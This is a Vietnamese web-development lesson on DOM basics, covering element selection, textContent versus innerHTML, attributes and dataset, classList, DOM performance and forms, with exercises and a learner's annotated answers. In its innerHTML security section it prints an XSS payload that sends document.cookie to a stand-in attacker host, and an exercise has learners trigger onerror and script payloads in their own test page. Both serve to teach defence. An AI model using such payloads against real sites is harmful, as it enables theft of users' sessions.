# 08 — DOM cơ bản

> **Cần có trước:** xong khối A và B (file `01` → `07`).
> **Thời gian:** 4 giờ.
> **Vì sao quan trọng:** đây là file đầu tiên code của bạn **hiện lên màn hình**. DOM là cầu nối giữa JavaScript và trang web. Sau này React sẽ làm phần lớn việc này thay bạn, nhưng bạn phải hiểu nó đang thay bạn làm cái gì — không thì mọi thứ ở chặng 4 sẽ là phép thuật.

---

## 1. DOM là gì

Khi trình duyệt tải một file HTML, nó không giữ lại chuỗi text đó. Nó **phân tích** và dựng lên một cấu trúc cây các object trong bộ nhớ. Cây đó là **DOM** (Document Object Model).

```html
<body>
  <div id="app">
    <h1>Tiêu đề</h1>
    <p>Nội dung</p>
  </div>
</body>
```

Trở thành:

```
document
└── html
    └── body
        └── div#app
            ├── h1
            │   └── (text) "Tiêu đề"
            └── p
                └── (text) "Nội dung"
```

Ba điểm cần nắm:

1. **DOM là object, không phải chuỗi.** Bạn thao tác với object, và trình duyệt vẽ lại màn hình theo object đó.
2. **DOM sống.** Sửa DOM thì màn hình đổi ngay. Không cần "lưu" hay "áp dụng".
3. **DOM khác HTML.** HTML là văn bản ban đầu. DOM là trạng thái hiện tại. Nếu JavaScript thêm một `<div>`, DOM có nó nhưng file HTML gốc thì không.

### Node và Element

Mọi thứ trong cây đều là **node**. Element chỉ là một loại node.

```html
<p>Xin <b>chào</b></p>
```

Thẻ `<p>` có **ba** node con: text node `"Xin "`, element `<b>`, và... thực ra là hai. Nhưng nếu HTML có xuống dòng và thụt lề, sẽ có thêm text node chứa khoảng trắng.

Đây là lý do bạn nên dùng nhóm API có chữ `Element`:

```javascript
p.childNodes        // gồm cả text node và comment
p.children          // CHỈ element — thường là thứ bạn muốn

p.firstChild            // có thể là text node khoảng trắng
p.firstElementChild     // chắc chắn là element
```

---

## 2. Chọn phần tử

### 2.1. Hai hàm chính

```javascript
document.querySelector("#app");            // element đầu tiên khớp, hoặc null
document.querySelectorAll(".item");        // NodeList tất cả element khớp
```

Chúng nhận **CSS selector** — đúng cú pháp bạn đã học ở chặng 1.

```javascript
document.querySelector(".card .tieu-de");
document.querySelector("input[type='email']");
document.querySelector("li:nth-child(2)");
document.querySelector("[data-id='5']");
```

Không tìm thấy thì `querySelector` trả về **`null`**, không phải `undefined`. Nên luôn kiểm tra:

```javascript
const el = document.querySelector("#khong-ton-tai");
el.textContent = "x";        // TypeError: Cannot set properties of null

// An toàn
if (el) el.textContent = "x";
el?.remove();                // optional chaining từ file 03
```

### 2.2. Nhóm hàm cũ

```javascript
document.getElementById("app");                 // nhanh nhất, nhưng chỉ theo id
document.getElementsByClassName("item");        // HTMLCollection
document.getElementsByTagName("p");             // HTMLCollection
```

`getElementById` vẫn dùng tốt. Hai hàm còn lại thì `querySelectorAll` thay thế được và linh hoạt hơn.

### 2.3. Live vs static — khác biệt quan trọng

```javascript
const live = document.getElementsByClassName("item");    // HTMLCollection — SỐNG
const tinh = document.querySelectorAll(".item");         // NodeList — TĨNH

console.log(live.length, tinh.length);   // 3 3

// Thêm một phần tử .item vào DOM
document.body.append(taoItemMoi());

console.log(live.length);   // 4 ← tự cập nhật
console.log(tinh.length);   // 3 ← chụp ảnh tại thời điểm gọi
```

`HTMLCollection` là **live**: nó phản ánh DOM hiện tại. `NodeList` từ `querySelectorAll` là **static**: nó là ảnh chụp.

Điều này gây bug kinh điển:

```javascript
const items = document.getElementsByClassName("item");
for (let i = 0; i < items.length; i++) {
  items[i].classList.remove("item");     // xóa class → phần tử rời khỏi collection
}
// Chỉ xử lý được một nửa! Vì length co lại trong lúc lặp
```

Cách an toàn: chuyển sang mảng thật trước.

```javascript
const items = [...document.getElementsByClassName("item")];
```

### 2.4. NodeList không phải mảng

```javascript
const ds = document.querySelectorAll(".item");

ds.forEach(el => ...);        // OK — NodeList CÓ forEach
ds.map(el => ...);            // TypeError — không có map, filter, reduce

// Chuyển thành mảng thật
[...ds].map(el => el.textContent);
Array.from(ds).filter(el => el.dataset.hoatDong);
```

Đây là chỗ nhiều người vấp: `forEach` chạy được nên tưởng nó là mảng, đến khi gọi `map` mới lỗi.

### 2.5. Tìm trong phạm vi hẹp

`querySelector` gọi được trên bất kỳ element nào, không chỉ `document`:

```javascript
const card = document.querySelector(".card");
const nut = card.querySelector("button");     // chỉ tìm bên trong card
```

Nên làm vậy khi có nhiều khối giống nhau trên trang — tìm trong phạm vi hẹp vừa đúng hơn vừa nhanh hơn.

---

## 3. Di chuyển trong cây

```javascript
el.parentElement            // cha
el.children                 // các con (chỉ element)
el.firstElementChild
el.lastElementChild
el.nextElementSibling       // anh em kế tiếp
el.previousElementSibling
```

Ba hàm rất hữu dụng:

```javascript
// closest — leo LÊN tìm tổ tiên gần nhất khớp selector
const card = nut.closest(".card");

// matches — element này có khớp selector không
if (el.matches(".hoat-dong")) { ... }

// contains — el có chứa phần tử kia không (kể cả gián tiếp)
if (menu.contains(e.target)) { ... }
```

`closest` sẽ là công cụ chính khi bạn làm event delegation ở file `09`. Ví dụ điển hình: người dùng bấm vào icon bên trong nút xóa, `e.target` là cái icon, nhưng `e.target.closest("[data-xoa]")` cho bạn đúng cái nút.

---

## 4. Đọc và ghi nội dung

### 4.1. Ba thuộc tính

```javascript
const el = document.querySelector("#demo");
// <div id="demo">Xin <b>chào</b></div>

el.textContent;    // "Xin chào"           — chỉ text, bỏ hết thẻ
el.innerHTML;      // "Xin <b>chào</b>"    — HTML bên trong
el.innerText;      // "Xin chào"           — text như người dùng NHÌN THẤY
```

### 4.2. `textContent` vs `innerText`

Khác biệt tinh tế nhưng đáng biết:

```html
<div id="a">
  Dòng 1
  <span style="display: none">Ẩn</span>
</div>
```

```javascript
a.textContent;   // "\n  Dòng 1\n  Ẩn\n"  — lấy tất cả, kể cả phần bị ẩn
a.innerText;     // "Dòng 1"              — chỉ phần hiển thị
```

`innerText` phải tính toán bố cục để biết cái gì đang hiển thị, nên nó **chậm** và buộc trình duyệt tính lại layout.

**Mặc định dùng `textContent`.** Chỉ dùng `innerText` khi bạn thật sự cần "text như người dùng thấy".

### 4.3. `innerHTML` và bảo mật

`innerHTML` phân tích chuỗi thành HTML thật:

```javascript
el.innerHTML = "<strong>Đậm</strong>";     // tạo ra thẻ strong thật
el.textContent = "<strong>Đậm</strong>";   // hiện ra đúng chuỗi đó trên màn hình
```

Vấn đề: nếu chuỗi đến từ người dùng, bạn vừa mở cửa cho **XSS** (Cross-Site Scripting).

```javascript
// NGUY HIỂM
const binhLuan = layTuNguoiDung();
khungBinhLuan.innerHTML = binhLuan;
```

Nếu người dùng nhập:

```html
<img src="x" onerror="fetch('https://ke-tan-cong.com?c=' + document.cookie)">
```

Ảnh lỗi → `onerror` chạy → cookie phiên đăng nhập của người xem bị gửi đi.

Chú ý: `<script>` chèn qua `innerHTML` **không** chạy — nhưng điều đó không cứu được bạn, vì các thuộc tính sự kiện như `onerror`, `onload` vẫn chạy bình thường.

**Quy tắc cứng:**

> Dữ liệu từ người dùng → **luôn** dùng `textContent`.
> Chỉ dùng `innerHTML` với chuỗi do chính bạn viết ra.

```javascript
// SAI
el.innerHTML = `<p>${tenNguoiDung}</p>`;

// ĐÚNG
const p = document.createElement("p");
p.textContent = tenNguoiDung;
el.append(p);
```

Bảo mật web là nội dung file `06` của chặng 6, nhưng thói quen này phải hình thành từ bây giờ.

---

## 5. Thuộc tính: attribute và property

Hai thứ khác nhau, dễ nhầm.

- **Attribute** — cái viết trong HTML
- **Property** — cái nằm trên object DOM

```html
<input id="o" type="text" value="ban đầu">
```

```javascript
const o = document.querySelector("#o");

o.value;                    // "ban đầu"
o.getAttribute("value");    // "ban đầu"

// Người dùng gõ "đã sửa" vào ô input, rồi:
o.value;                    // "đã sửa"       ← giá trị HIỆN TẠI
o.getAttribute("value");    // "ban đầu"      ← giá trị BAN ĐẦU trong HTML
```

**Với form, luôn dùng property (`.value`, `.checked`), không dùng `getAttribute`.** Đây là bug rất hay gặp ở người mới.

### API cho attribute

```javascript
el.getAttribute("href");
el.setAttribute("href", "/trang-moi");
el.removeAttribute("disabled");
el.hasAttribute("data-id");
```

### `data-*` và `dataset`

```html
<button data-id="42" data-hanh-dong="xoa" data-user-name="an">Xóa</button>
```

```javascript
nut.dataset.id;          // "42"     — luôn là CHUỖI
nut.dataset.hanhDong;    // "xoa"    ← data-hanh-dong → hanhDong (camelCase)
nut.dataset.userName;    // "an"     ← data-user-name → userName

nut.dataset.trangThai = "dang-xu-ly";   // tạo data-trang-thai="dang-xu-ly"
```

Hai điều nhớ:
1. Tên chuyển từ `kebab-case` sang `camelCase`
2. Giá trị **luôn là chuỗi** — cần số thì `Number(nut.dataset.id)`

`data-*` là cách chuẩn để gắn dữ liệu vào phần tử DOM, và là nền tảng của event delegation ở file `09`.

---

## 6. Class và style

### 6.1. `classList`

```javascript
el.classList.add("hoat-dong");
el.classList.add("a", "b");                 // thêm nhiều
el.classList.remove("an");
el.classList.toggle("mo");                  // có thì bỏ, không có thì thêm
el.classList.toggle("mo", dieuKien);        // ép theo điều kiện boolean
el.classList.contains("hoat-dong");         // true/false
el.classList.replace("cu", "moi");
```

Đừng dùng `el.className = "x"` — nó **ghi đè toàn bộ** class hiện có.

Tham số thứ hai của `toggle` rất tiện:

```javascript
// Thay vì
if (dangTai) el.classList.add("loading");
else el.classList.remove("loading");

// Viết
el.classList.toggle("loading", dangTai);
```

### 6.2. `style`

```javascript
el.style.color = "red";
el.style.backgroundColor = "blue";      // camelCase, không phải background-color
el.style.setProperty("--mau-chinh", "#333");   // CSS variable

el.style.color;                          // chỉ đọc được INLINE style
getComputedStyle(el).color;              // giá trị THỰC TẾ đang áp dụng
```

`el.style` chỉ thấy style viết trực tiếp trên phần tử. Style từ file CSS không hiện ở đó — phải dùng `getComputedStyle`.

### Nguyên tắc quan trọng

**Ưu tiên đổi class, không đổi style trực tiếp.**

```javascript
// Kém
el.style.display = "none";
el.style.opacity = "0.5";

// Tốt hơn
el.classList.add("an");
```

Lý do: giao diện được định nghĩa ở CSS, JavaScript chỉ điều khiển **trạng thái**. Tách bạch như vậy thì đổi giao diện chỉ cần sửa CSS, không phải mò trong code JS.

---

## 7. Tạo và chèn phần tử

### 7.1. Tạo

```javascript
const div = document.createElement("div");
div.className = "card";
div.textContent = "Nội dung";
div.dataset.id = "1";
```

Lúc này `div` mới chỉ tồn tại trong bộ nhớ. Chưa chèn vào DOM thì chưa hiện lên màn hình.

### 7.2. Chèn

```javascript
cha.append(con);              // thêm vào cuối — nhận nhiều node VÀ chuỗi
cha.prepend(con);             // thêm vào đầu
el.before(con);               // chèn trước el (thành anh em)
el.after(con);                // chèn sau el

cha.appendChild(con);         // API cũ: chỉ một node, không nhận chuỗi
```

`append` linh hoạt hơn hẳn:

```javascript
cha.append(node1, node2, "chuỗi text");    // OK
cha.appendChild("chuỗi");                   // TypeError
```

Dùng `append`/`prepend`/`before`/`after` cho code mới.

### 7.3. `insertAdjacentHTML`

```javascript
el.insertAdjacentHTML("beforebegin", "<p>trước el</p>");
el.insertAdjacentHTML("afterbegin",  "<p>đầu bên trong el</p>");
el.insertAdjacentHTML("beforeend",   "<p>cuối bên trong el</p>");
el.insertAdjacentHTML("afterend",    "<p>sau el</p>");
```

Vị trí tương ứng:

```html
<!-- beforebegin -->
<div id="el">
  <!-- afterbegin -->
  nội dung
  <!-- beforeend -->
</div>
<!-- afterend -->
```

Ưu điểm so với `innerHTML +=`: nó **không phá và dựng lại** nội dung hiện có. `innerHTML +=` sẽ hủy toàn bộ phần tử con rồi tạo lại, làm mất mọi event listener đã gắn và mọi trạng thái (ví dụ ô input đang gõ dở).

```javascript
// XẤU — phá hủy và dựng lại tất cả
ds.innerHTML += "<li>Mới</li>";

// TỐT
ds.insertAdjacentHTML("beforeend", "<li>Mới</li>");
```

Vẫn nhớ: `insertAdjacentHTML` cũng phân tích HTML, nên **không** dùng với dữ liệu người dùng.

### 7.4. Nhân bản

```javascript
const ban = goc.cloneNode(true);    // true = sao chép cả cây con
const nong = goc.cloneNode(false);  // chỉ chính nó
```

Lưu ý: `cloneNode` **không** sao chép event listener đã gắn bằng `addEventListener`.

### 7.5. Xóa và thay thế

```javascript
el.remove();                  // tự xóa mình
el.replaceWith(elMoi);        // thay bằng phần tử khác
cha.replaceChildren();        // xóa sạch con — nhanh và rõ hơn innerHTML = ""
cha.replaceChildren(a, b);    // thay toàn bộ con bằng a, b
```

---

## 8. Hiệu năng DOM

Mỗi lần bạn sửa DOM, trình duyệt có thể phải tính lại bố cục (**reflow**) và vẽ lại (**repaint**). Đây là thao tác đắt.

```javascript
// XẤU — chèn 1000 lần, có thể gây 1000 lần reflow
for (let i = 0; i < 1000; i++) {
  const li = document.createElement("li");
  li.textContent = i;
  ds.append(li);
}
```

**Cách 1 — DocumentFragment:**

```javascript
const frag = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement("li");
  li.textContent = i;
  frag.append(li);          // fragment nằm ngoài DOM → không reflow
}
ds.append(frag);            // chỉ một lần chạm vào DOM
```

**Cách 2 — dựng chuỗi rồi chèn một lần:**

```javascript
const html = duLieu.map(x => `<li>${x}</li>`).join("");
ds.insertAdjacentHTML("beforeend", html);
```

Nhanh, nhưng chỉ dùng khi dữ liệu **an toàn**.

### Đọc và ghi xen kẽ — layout thrashing

```javascript
// XẤU — ép trình duyệt tính lại layout ở mỗi vòng
for (const el of dsPhanTu) {
  el.style.height = el.offsetHeight + 10 + "px";   // đọc rồi ghi, đọc rồi ghi
}

// TỐT — đọc hết trước, ghi hết sau
const cao = dsPhanTu.map(el => el.offsetHeight);
dsPhanTu.forEach((el, i) => {
  el.style.height = cao[i] + 10 + "px";
});
```

Đọc thuộc tính như `offsetHeight`, `getBoundingClientRect()` buộc trình duyệt phải tính layout ngay. Xen kẽ đọc-ghi liên tục làm nó tính đi tính lại — gọi là **layout thrashing**.

Nguyên tắc chung: **giảm số lần chạm vào DOM.** Tính toán trong JavaScript thì rẻ; đụng vào DOM thì đắt.

Đây cũng chính là bài toán mà Virtual DOM của React sinh ra để giải quyết. Bạn sẽ gặp lại ở chặng 4.

---

## 9. Làm việc với form

```javascript
input.value;               // giá trị hiện tại (chuỗi)
checkbox.checked;          // boolean
select.value;              // giá trị option đang chọn
radio.checked;
textarea.value;

input.disabled = true;
input.focus();
input.select();            // bôi đen toàn bộ text
form.reset();
```

Ba điểm hay sai:

```javascript
// 1. value LUÔN là chuỗi
const n = input.value;         // "5"
n + 1;                         // "51" ← nhớ file 01
Number(input.value) + 1;       // 6

// 2. Checkbox dùng .checked, không phải .value
checkbox.value;                // "on" — gần như vô dụng
checkbox.checked;              // true/false ← dùng cái này

// 3. Ô rỗng cho chuỗi rỗng, không phải null
input.value;                   // "" khi trống
Number("");                    // 0  ← cẩn thận, nhớ bảng ép kiểu file 01
```

---

## 10. Kích thước và vị trí

```javascript
el.getBoundingClientRect();
// { top, left, right, bottom, width, height, x, y } — so với viewport

el.offsetWidth;      // chiều rộng kể cả padding và border
el.clientWidth;      // kể cả padding, không kể border và scrollbar
el.scrollHeight;     // toàn bộ chiều cao nội dung, kể cả phần bị cuộn khuất

window.innerWidth;
window.scrollY;
```

Dùng khi cần định vị tooltip, kiểm tra phần tử có trong tầm nhìn, làm hiệu ứng cuộn. Nhớ mục 8: đọc những giá trị này gây tính lại layout, đừng đọc trong vòng lặp.

---

## 11. Lỗi thường gặp

| Hiện tượng | Nguyên nhân | Cách sửa |
|---|---|---|
| `Cannot set properties of null` | `querySelector` không tìm thấy | Kiểm tra selector; kiểm tra script chạy sau DOM (`defer`) |
| Code không chạy, không lỗi | Script chạy trước khi DOM dựng xong | Dùng `defer` — nhớ file `00` |
| `ds.map is not a function` | NodeList không phải mảng | `[...ds].map(...)` |
| Vòng lặp trên HTMLCollection bỏ sót phần tử | Collection live co lại trong lúc lặp | Chuyển sang mảng trước |
| `getAttribute("value")` không đổi khi người dùng gõ | Attribute ≠ property | Dùng `.value` |
| `dataset.id + 1` ra chuỗi dính nhau | `dataset` luôn trả chuỗi | `Number(el.dataset.id)` |
| Event listener biến mất sau khi cập nhật danh sách | `innerHTML +=` dựng lại toàn bộ | `insertAdjacentHTML` hoặc `append` |
| Class khác bị mất khi thêm class mới | Gán `className` ghi đè hết | Dùng `classList.add` |
| `el.style.color` trả về rỗng | Chỉ đọc được inline style | `getComputedStyle(el).color` |
| Trang giật khi chèn nhiều phần tử | Reflow nhiều lần | `DocumentFragment` |
| Người dùng nhập HTML và nó chạy được | Dùng `innerHTML` với dữ liệu người dùng | `textContent` |

---

## 12. Tóm tắt cần thuộc

1. DOM là cây object trong bộ nhớ, không phải chuỗi HTML
2. `querySelector` trả `null` khi không thấy — luôn kiểm tra
3. `HTMLCollection` sống, `NodeList` từ `querySelectorAll` tĩnh
4. NodeList có `forEach` nhưng không có `map` — trải thành mảng trước
5. `textContent` an toàn và nhanh; `innerText` chậm; `innerHTML` nguy hiểm
6. Dữ liệu người dùng → **luôn** `textContent`
7. Attribute là giá trị ban đầu, property là giá trị hiện tại — form dùng property
8. `dataset` luôn trả chuỗi, tên chuyển sang camelCase
9. Ưu tiên đổi `classList`, đừng đổi `style` trực tiếp
10. `append` linh hoạt hơn `appendChild`
11. `innerHTML +=` phá hủy và dựng lại — mất listener và trạng thái
12. Giảm số lần chạm DOM: `DocumentFragment`, đọc hết trước rồi ghi hết sau
13. `closest` để leo lên tìm tổ tiên — công cụ chính của file `09`

---

## Bài tập

Từ file này, mỗi bài tập là **một thư mục riêng** vì cần cả HTML, CSS và JS.

### Bài 1 — Đoán output

Tạo `bai-tap-08/kham-pha/`. Với HTML sau:

```html
<div id="app" data-user-id="42" data-ten-day-du="Nguyễn Văn An">
  <h1 class="tieu-de chinh">Xin <b>chào</b></h1>
  <ul id="ds">
    <li class="item">A</li>
    <li class="item">B</li>
    <li class="item">C</li>
  </ul>
  <input id="o-nhap" type="text" value="ban đầu">
  <input id="o-check" type="checkbox" value="abc">
</div>
```

Ghi đoán vào `du-doan.md` trước khi chạy:

```javascript
const app = document.querySelector("#app");
const h1 = document.querySelector("h1");
const oNhap = document.querySelector("#o-nhap");
const oCheck = document.querySelector("#o-check");

// A
console.log(h1.textContent); -> "Xin chào"
console.log(h1.innerHTML); -> "Xin <b>chào</b>?"

// B
console.log(app.dataset.userId, typeof app.dataset.userId); -? "42" , "string"
console.log(app.dataset.tenDayDu); -> "Nguyễn Văn An"
console.log(app.dataset.userId + 1); -> "421"

// C
const live = document.getElementsByClassName("item");
const tinh = document.querySelectorAll(".item");
document.querySelector("#ds").insertAdjacentHTML("beforeend", '<li class="item">D</li>');
console.log(live.length, tinh.length); -> 4 3 

// D
// ❌ SAI/THIẾU: đáp án 2 (typeof tinh.map) là "undefined", không phải "chịu".
// NodeList không có hàm map, nên tinh.map chỉ là ĐỌC một thuộc tính không tồn tại
// -> trả về undefined (không lỗi gì cả, vì chưa GỌI nó). typeof undefined = "undefined".
// Lỗi TypeError chỉ xảy ra nếu bạn thật sự gọi tinh.map(...) (gọi một thứ không phải hàm).
console.log(typeof tinh.forEach, typeof tinh.map); -> function , "undefined"

// E — sau khi bạn tự tay gõ "đã sửa" vào ô input rồi chạy
console.log(oNhap.value); -> "đã sửa"
console.log(oNhap.getAttribute("value")); -> "ban đầu"

// F — sau khi bạn tự tay tick vào checkbox
console.log(oCheck.value); -> "abc"
console.log(oCheck.checked); -> true

// G
console.log(document.querySelector("#khong-co")); -> null
console.log(document.querySelectorAll("#khong-co").length); -> 0

// H
console.log(h1.className); -> "tieu-de chinh"
h1.classList.add("moi");
console.log(h1.className); -> "tieu-de chinh moi"
h1.className = "ghi-de";
console.log(h1.className); -> "ghi-de"

// I
console.log(document.querySelector("#ds").children.length);-> 3 vì children chỉ các con thôi và có 3 con 
// ❌ SAI/THIẾU: đáp án đúng là 7, không phải "chịu" — đây là câu quan trọng nhất bài.
// HTML có xuống dòng + thụt lề giữa các <li>, mỗi khoảng trắng đó là MỘT text node riêng:
// (text trắng trước li A) + li A + (text trắng giữa A-B) + li B + (text trắng giữa B-C) + li C + (text trắng sau C, trước </ul>)
// = 3 <li> (element) + 4 text node (khoảng trắng) = 7.
// children CHỈ đếm element (bỏ qua text node) nên ra 3; childNodes đếm TẤT CẢ node nên ra 7.
// Đây chính là lý do hai số khác nhau mà đề bài yêu cầu giải thích.
console.log(document.querySelector("#ds").childNodes.length); -> 7
```

Câu I là câu quan trọng nhất — giải thích vì sao hai con số khác nhau.

### Bài 2 — Thao tác DOM cơ bản

Trong cùng thư mục, viết các hàm sau và test từng cái:

1. `themItem(noiDung)` — thêm `<li>` vào cuối danh sách, dùng `createElement` + `textContent`
2. `xoaItemCuoi()` — xóa phần tử cuối, xử lý được trường hợp danh sách rỗng
3. `daoNguoc()` — đảo thứ tự các `<li>` hiện có
4. `danhDauChan()` — thêm class `chan` vào các item ở vị trí chẵn
5. `demItem()` — đếm số item, trả về số
6. `xoaSach()` — xóa hết item, dùng `replaceChildren`
7. `themNhieu(n)` — thêm `n` item, **dùng `DocumentFragment`**. Đo thời gian với `n = 5000` bằng `performance.now()`, so sánh với cách chèn từng cái. Ghi cả hai con số vào `du-doan.md`.

### Bài 3 — Chứng minh lỗ hổng XSS

Tạo `bai-tap-08/xss/`:

```html
<input id="o-nhap" placeholder="Nhập nội dung">
<button id="nut-html">Hiển thị bằng innerHTML</button>
<button id="nut-text">Hiển thị bằng textContent</button>
<div id="ket-qua"></div>
```

Thử nhập lần lượt và ghi lại kết quả vào `du-doan.md`:

1. `<b>đậm</b>`
2. `<img src="x" onerror="alert('XSS!')">`
3. `<script>alert('hi')</script>`

Trả lời trong `du-doan.md`:
- Nút nào an toàn, nút nào không?
- Vì sao chuỗi số 3 **không** chạy mà số 2 lại chạy?
- Một trang bình luận thật nên dùng cách nào?

Bài này ngắn nhưng đáng làm — thấy tận mắt một lần thì sẽ nhớ mãi.

### Bài 4 — Máy tính (bài chính)

Tạo `bai-tap-08/may-tinh/` với ba file: `index.html`, `style.css`, `main.js`.

**Giao diện:**

```
┌─────────────────────┐
│         0           │  ← màn hình, canh phải
├─────┬─────┬────┬────┤
│  C  │ +/- │ %  │ ÷  │
├─────┼─────┼────┼────┤
│  7  │  8  │ 9  │ ×  │
├─────┼─────┼────┼────┤
│  4  │  5  │ 6  │ −  │
├─────┼─────┼────┼────┤
│  1  │  2  │ 3  │ +  │
├─────┴─────┼────┼────┤
│     0     │ .  │ =  │
└───────────┴────┴────┘
```

**Yêu cầu kỹ thuật:**

- Bố cục bằng **CSS Grid** (chặng 1)
- Mỗi nút mang `data-loai` (`so`, `toan-tu`, `hanh-dong`) và `data-gia-tri`
- **Không dùng `eval()`** — tự viết logic tính
- **Không dùng `innerHTML`** ở bất kỳ đâu

**Chức năng:**

1. Bấm số → hiện trên màn hình
2. Bốn phép tính cơ bản
3. `=` cho kết quả; bấm `=` liên tiếp lặp lại phép tính cuối (ví dụ `5 + 3 =` ra 8, bấm `=` nữa ra 11)
4. `C` xóa hết về `0`
5. `+/-` đổi dấu
6. `%` chia cho 100
7. `.` thêm dấu thập phân, **không cho thêm hai dấu chấm**
8. Chia cho `0` hiện `"Lỗi"`, và mọi nút sau đó (trừ `C`) không làm gì
9. Số quá dài thì tự thu nhỏ cỡ chữ hoặc rút gọn, không tràn khung
10. Bấm toán tử liên tiếp (`5 + × 3`) thì thay toán tử, không lỗi
11. Kết quả `0.1 + 0.2` phải hiện `0.3`, không phải `0.30000000000000004` — nhớ file `01`
12. Hỗ trợ **bàn phím**: số, `+ - * /`, `Enter` = bằng, `Escape` = xóa, `Backspace` xóa một ký tự

**Về cấu trúc code:**

Tách rõ hai phần:

```javascript
// Phần 1: trạng thái + logic thuần, KHÔNG đụng DOM
const trangThai = {
  soHienTai: "0",
  soTruoc: null,
  toanTu: null,
  choSoMoi: false,
  loi: false
};

function nhapSo(so) { ... }        // chỉ sửa trangThai
function chonToanTu(t) { ... }
function tinhKetQua() { ... }

// Phần 2: vẽ giao diện từ trạng thái
function ve() {
  manHinh.textContent = trangThai.soHienTai;
}
```

Mọi thay đổi đi theo một chiều: **sự kiện → sửa trạng thái → gọi `ve()`**. Không sửa DOM rải rác trong các hàm logic.

Yêu cầu này quan trọng hơn bản thân cái máy tính. Đây chính là mô hình mà React dùng, và làm quen với nó từ bây giờ sẽ khiến chặng 4 dễ hơn rất nhiều.

**Kiểm thử bắt buộc** — ghi kết quả vào `du-doan.md`:

| Thao tác | Kết quả mong đợi |
|---|---|
| `5 + 3 =` | `8` |
| `5 + 3 = =` | `11` |
| `0.1 + 0.2 =` | `0.3` |
| `5 ÷ 0 =` | `Lỗi` |
| `5 + × 3 =` | `15` |
| `1 . 5 . 5` | `1.55` |
| `C` sau khi lỗi | `0`, dùng lại bình thường |
| Gõ `9` trên bàn phím | hiện `9` |

### Bài 5 — Giải thích bằng lời

Viết vào `du-doan.md`, mỗi câu 4–6 dòng:

1. DOM là gì? Nó khác file HTML ở điểm nào?
2. `textContent`, `innerText`, `innerHTML` khác nhau ra sao? Khi nào dùng cái nào?
3. Vì sao `innerHTML` với dữ liệu người dùng là nguy hiểm? Kể lại thí nghiệm ở bài 3.
4. HTMLCollection và NodeList khác nhau chỗ nào? Cái nào gây bug và bug thế nào?
5. Attribute và property khác nhau ra sao? Cho ví dụ với thẻ `input`.
6. Vì sao nên hạn chế chạm vào DOM? Kể hai kỹ thuật giảm số lần chạm.

---

## Xong file này khi

- [ ] Bài 1 đủ 9 câu có phần đoán viết trước, giải thích được câu I
- [ ] 7 hàm ở bài 2 chạy đúng, có số liệu đo thời gian `DocumentFragment`
- [ ] Bài 3 đã tận mắt thấy `alert("XSS!")` chạy, và giải thích được vì sao
- [ ] Máy tính chạy đúng cả 8 tình huống kiểm thử
- [ ] Máy tính tách được logic khỏi DOM — không có `document.` nào trong các hàm tính toán
- [ ] Máy tính không dùng `eval` và không dùng `innerHTML`
- [ ] Trả lời được 6 câu ở bài 5 bằng lời

Máy tính là sản phẩm đầu tiên của bạn ở chặng 2 — làm cho tử tế, chụp màn hình lại, nó sẽ nằm trong portfolio.

Xong thì gửi mình cả thư mục `may-tinh/` + `du-doan.md`, kèm **"viết file 09-su-kien-va-delegation"**.